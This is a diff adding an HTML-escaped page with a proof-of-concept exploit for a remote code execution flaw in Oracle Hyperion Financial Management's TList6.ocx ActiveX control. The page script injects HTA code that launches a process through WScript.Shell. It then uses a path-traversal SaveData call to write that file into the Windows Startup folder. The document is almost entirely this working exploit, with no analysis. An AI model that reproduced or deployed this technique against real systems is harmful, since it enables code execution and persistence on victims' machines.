@@ -1,0 +1,25 @@
+&lt;html&gt;&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=ISO-8859-1&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&amp;lt;!--
+Oracle Hyperion Financial Management 11.1.2.1.0
+TList6.ocx ActiveX Control Remote Code Execution Vulnerability PoC
+
+tested against Internet Explorer 8
+Microsoft Windows 2003 r2 sp2
+
+Binary Path: C:\WINDOWS\system32\TList6.ocx
+ProgID: TList.TList.6
+CLSID: {65996200-3B87-11D4-A21F-00E029189826}
+Safe for Initialization (Registry): True
+Safe for Scripting (Registry): True
+
+rgod
+--&amp;gt;
+&amp;lt;!-- saved from url=(0014)about:internet --&amp;gt; 
+&amp;lt;html&amp;gt;
+&amp;lt;object classid=&#039;clsid:65996200-3B87-11D4-A21F-00E029189826&#039; id=&#039;obj&#039; /&amp;gt;
+&amp;lt;/object&amp;gt;
+&amp;lt;script&amp;gt;
+obj.Caption = &quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;lt;&quot; + &quot;SCRIPT&amp;gt; var x=new ActiveXObject(\&quot;WScript.Shell\&quot;); x.Exec(\&quot;CALC.EXE\&quot;); &amp;lt;&quot; +&quot;/SCRIPT&amp;gt;&quot;;
+obj.SaveData(&quot;..\\..\\..\\..\\..\\..\\..\\..\\..\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\suntzu.hta&quot;);
+&amp;lt;/script&amp;gt;
+&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
